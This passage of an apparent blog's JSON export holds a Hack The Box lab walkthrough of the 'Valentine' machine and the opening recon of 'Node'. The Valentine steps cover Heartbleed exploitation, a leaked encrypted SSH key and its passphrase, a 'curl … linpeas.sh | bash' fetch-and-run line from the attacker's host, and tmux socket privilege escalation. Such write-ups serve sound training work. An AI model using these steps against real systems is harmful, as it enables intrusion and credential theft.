XGhsDkvBLUWJ3DSWwWM4pG9qmWPT241OCaaiIkVT4KcjRIc+x+91GWYNQvvdnFLO | 5CfrRGkFHwJT1E6vGXJejx6nhTmis88ByQ9g9D2NgcHENfQPAW1by7ONkqiXtV3S | q56X7q0yLQdSTe63dEzK8eSTN1KWUXDoNRfAYfHttJqKg2OUqUDVWkNzmUiIe4sP | csAwIHShdX+Jd8E5oty5C07FJrzVtW+Yf4h8UHKLuJ4E8BYbkxkc5vDcXnKByeJa | gRSFfyZx/VqBh9c= |_-----END CERTIFICATE----- |_http-server-header: Apache/2.2.22 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   Directory Traversal 1  gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -n   Exploitation  http://10.1bas0.10.79/dev/  1 2 3  # hype_key 2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d    http://10.10.10.79/encode/   http://10.10.10.79/decode/   http://10.10.10.79/omg  In the scan we also see port 443 let’s visit → https://10.10.10.79/\n Checking the certificate   Adding to /etc/hosts  1 2 3  nano /etc/hosts 10.10.10.79 valentine.htb    Let’s going through the https directories, nothing interesting  1  gobuster dir -u https://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -n -k    Run another scan on the machine with vuln script  1  nmap --script vuln -oN valentine_vuln_scan.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62  PORT STATE SERVICE 22/tcp open ssh 80/tcp open http |_http-stored-xss: Couldn\u0026#39;t find any stored XSS vulnerabilities. |_http-csrf: Couldn\u0026#39;t find any CSRF vulnerabilities. | http-enum: | /dev/: Potentially interesting directory w/ listing on \u0026#39;apache/2.2.22 (ubuntu)\u0026#39; |_ /index/: Potentially interesting folder |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) |_http-dombased-xss: Couldn\u0026#39;t find any DOM based XSS. 443/tcp open https |_http-csrf: Couldn\u0026#39;t find any CSRF vulnerabilities. |_http-dombased-xss: Couldn\u0026#39;t find any DOM based XSS. |_http-stored-xss: Couldn\u0026#39;t find any stored XSS vulnerabilities. | ssl-ccs-injection: | VULNERABLE: | SSL/TLS MITM vulnerability (CCS Injection) | State: VULNERABLE | Risk factor: High | OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h | does not properly restrict processing of ChangeCipherSpec messages, | which allows man-in-the-middle attackers to trigger use of a zero | length master key in certain OpenSSL-to-OpenSSL communications, and | consequently hijack sessions or obtain sensitive information, via | a crafted TLS handshake, aka the \u0026#34;CCS Injection\u0026#34; vulnerability. | | References: | http://www.openssl.org/news/secadv_20140605.txt | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224 |_ http://www.cvedetails.com/cve/2014-0224 |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) | ssl-heartbleed: | VULNERABLE: | The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption. | State: VULNERABLE | Risk factor: High | OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves. | | References: | http://www.openssl.org/news/secadv_20140407.txt | http://cvedetails.com/cve/2014-0160/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160 | ssl-poodle: | VULNERABLE: | SSL POODLE information leak | State: VULNERABLE | IDs: CVE:CVE-2014-3566 BID:70574 | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a | padding-oracle attack, aka the \u0026#34;POODLE\u0026#34; issue. | Disclosure date: 2014-10-14 | Check results: | TLS_RSA_WITH_AES_128_CBC_SHA | References: | https://www.securityfocus.com/bid/70574 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 | https://www.openssl.org/~bodo/ssl-poodle.pdf |_ https://www.imperialviolet.org/2014/10/14/poodle.html | http-enum: | /dev/: Potentially interesting directory w/ listing on \u0026#39;apache/2.2.22 (ubuntu)\u0026#39; |_ /index/: Potentially interesting folder   Using SSL scanner 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  sslyze --heartbleed 10.10.10.79:443 CHECKING CONNECTIVITY TO SERVER(S) ---------------------------------- 10.10.10.79:443 =\u0026gt; 10.10.10.79 SCAN RESULTS FOR 10.10.10.79:443 - 10.10.10.79 ---------------------------------------------- * OpenSSL Heartbleed: VULNERABLE - Server is vulnerable to Heartbleed SCANS COMPLETED IN 0.371675 S ----------------------------- COMPLIANCE AGAINST MOZILLA TLS CONFIGURATION -------------------------------------------- Disabled; use --mozilla-config={old, intermediate, modern}.   Google for python heartbleed → https://gist.github.com/eelsivart/10174134\n1  wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py   Explanation for heartbleed → https://xkcd.com/1354/\n1  python heartbleed.py -n 150 10.10.10.79 -a heartbleed_leak.txt # [-n] to repeat the time of connections to see the leak and [-a] output the files   1 2 3 4  $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== # This was all after running the python script echo -n \u0026#34;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==\u0026#34; | base64 -d -\u0026gt; heartbleedbelievethehype    Let’s download the /hype_key  1  wget http://10.10.10.79/dev/hype_key   1  2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d    Convert hex into ascii → https://www.rapidtables.com/convert/number/hex-to-ascii.html  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46 DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe 2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3 -----END RSA PRIVATE KEY-----    Alternatively you can use  1  xdd -r -p hype_key # [-r] convert hexdump into binary, [-p] convert iunto plaintext    Give permission to the key  1  chmod 600 hype.key    It is asking for the passphrase, it could be the one we found earlier with encoded in base64  1  passphrase: heartbleedbelievethehype   1  ssh -i hype.key hype@10.10.10.79   Privilege Escalation 1 2  uname -a Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux   1  python -m SimpleHTTPServer   1  curl http://10.10.14.4:8000/linpeas.sh | bash    /usr/bin/tmux -S /.devs/dev_sess  We can read and write\n Running the same command  1  tmux -S /.devs/dev_sess   Skills Learned  Identifying servers vulnerable to Heartbleed Exploiting Heartbleed Exploiting permissive tmux sessions  ","description":"Valentine is a very unique medium difficulty machine which focuses on the Heartbleed vulnerability, which had devastating impact on systems across the globe.","id":12,"section":"posts","tags":["Hackthebox","OSCP","ssl","web","vulnerability assessment","session handling","outdated software","web site structure discovery","weak permissions"],"title":"Hackthebox - Valentine","uri":"https://hswootan.github.io/en/posts/valentine/"},{"content":"\r\rEnumeration 1  nmap -sC -sV 10.10.10.58 -oN node_scan   1 2 3 4 5 6 7 8 9 10 11 12 13  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA) | 256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA) |_ 256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519) 3000/tcp open hadoop-datanode Apache Hadoop | hadoop-datanode-info: |_ Logs: /login | hadoop-tasktracker-info: |_ Logs: /login |_http-title: MyPlace Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   1  nmap -A -p- -sC -sV 10.10.10.58 -oN node_scan_2    Cannot use dirbuster, gobuster or any other automated directory search tools. There is a filter that prevents the usage of these tools  1  gobuster dir -u http://10.10.10.58:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -n    If we curl we can find info and response  1  curl -vvv 10.10.10.58:3000curl   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110  * Trying 10.10.10.58:3000... * Connected to 10.10.10.58 (10.10.10.58) port 3000 (#0) \u0026gt; GET / HTTP/1.1 \u0026gt; Host: 10.10.10.58:3000 \u0026gt; User-Agent: curl/7.81.0 \u0026gt; Accept: */* \u0026gt; * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 200 OK \u0026lt; X-Powered-By: Express \u0026lt; Accept-Ranges: bytes \u0026lt; Cache-Control: public, max-age=0 \u0026lt; Last-Modified: Sat, 02 Sep 2017 11:27:58 GMT \u0026lt; ETag: W/\u0026#34;f15-15e4258ef70\u0026#34; \u0026lt; Content-Type: text/html; charset=UTF-8 \u0026lt; Content-Length: 3861 \u0026lt; Date: Fri, 11 Mar 2022 04:14:30 GMT \u0026lt; Connection: keep-alive \u0026lt; \u0026lt;!doctype html\u0026gt; \u0026lt;!--[if lt IE 7]\u0026gt; \u0026lt;html class=\u0026#34;no-js lt-ie9 lt-ie8 lt-ie7\u0026#34;\u0026gt; \u0026lt;![endif]--\u0026gt; \u0026lt;!--[if IE 7]\u0026gt; \u0026lt;html class=\u0026#34;no-js lt-ie9 lt-ie8\u0026#34;\u0026gt; \u0026lt;![endif]--\u0026gt; \u0026lt;!--[if IE 8]\u0026gt; \u0026lt;html class=\u0026#34;no-js lt-ie9\u0026#34;\u0026gt; \u0026lt;![endif]--\u0026gt; \u0026lt;!--[if gt IE 8]\u0026gt;\u0026lt;!--\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34; ng-csp=\u0026#34;\u0026#34; ng-app=\u0026#34;myplace\u0026#34;\u0026gt; 